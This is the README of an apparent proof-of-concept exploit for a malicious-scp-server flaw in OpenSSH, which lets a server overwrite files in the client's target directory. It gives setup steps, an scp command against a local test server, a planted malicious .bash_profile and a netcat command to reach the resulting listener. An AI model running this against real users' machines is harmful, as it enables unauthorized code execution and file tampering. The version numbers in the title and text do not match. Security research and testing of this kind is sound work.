## Readme

# OpenSSH <7.8p1

#### An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the scp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the scp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file).

Install paramiko:
```
pip install paramiko
```

```
scp -P 2222 foo@localhost:test.txt .
```

The malicious script .bash_profile will be uploaded too, listening a connection in netcat.

```
nc <IP> <PORT>
```
